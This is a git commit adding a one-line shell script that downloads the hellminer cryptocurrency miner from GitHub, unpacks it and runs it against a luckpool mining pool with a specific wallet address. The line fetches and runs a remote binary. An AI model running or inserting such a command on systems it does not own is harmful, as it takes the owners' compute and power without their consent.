219cd05f887db6e5e34e36d37a36b44ad9c5453a
adefff <108704960+adefff@users.noreply.github.com>
2024-09-22 22:30:30 +0700

    Create coba3.sh

---
+++ coba3.sh
@@ -0,0 +1,1 @@
+wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RGBAfdNHRUYMK7N3Fep2RonH6dr21qrPUJ.tc3 -p x --cpu 3
